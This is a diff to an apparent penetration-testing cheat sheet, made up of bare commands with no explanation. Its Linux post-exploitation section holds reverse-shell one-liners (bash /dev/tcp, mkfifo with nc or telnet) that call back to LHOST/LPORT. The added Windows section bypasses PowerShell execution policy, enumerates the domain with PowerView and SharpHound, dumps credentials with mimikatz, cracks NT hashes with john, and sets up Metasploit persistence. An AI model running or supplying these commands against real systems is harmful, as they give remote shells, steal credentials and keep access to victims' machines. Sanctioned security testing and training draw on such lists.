@@ -50,6 +50,8 @@ git clone https://github.com/SecureAuthCorp/impacket
 
 ################################################################ POST LINUX
 
+git clone https://github.com/melnicek/peh
+
 bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
 rm /tmp/y;mkfifo /tmp/y;cat /tmp/y|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/y
 rm /tmp/y;mkfifo /tmp/y;cat /tmp/y|/bin/ssh -i 2>&1|telnet LHOST LPORT >/tmp/y
@@ -79,6 +81,32 @@ sudo tcpdump -i INTERFACE -X
 sudo tcpdump -i INTERFACE host HOST
 sudo tcpdump -i INTERFACE src host HOST
 sudo tcpdump -i INTERFACE tcp src port PORT
+
+################################################################ POST WINDOWS
+
+git clone https://github.com/melnicek/peh
+
+powershell -ep bypass
+
+. .\PowerView.ps1
+Get-NetUser | select cn
+Get-NetGroup -GroupName *admin*
+Get-NetShare
+Invoke-ShareFinder
+Get-NetComputers
+Get-NetComputer -fulldata | select operatingsystem
+https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
+
+. .\Downloads\SharpHound.ps1
+Invoke-Bloodhound -CollectionMethod All -Domain DOMAIN -ZipFileName loot.zip
+
+mimikatz.exe
+> privilege::debug
+> lsadump::lsa /patch
+john crack.me --wordlist=~/wordlists/rockyou.txt --format=NT
+
+use exploit/windows/local/persistence
+set session 1
 
 ################################################################ RECON
 
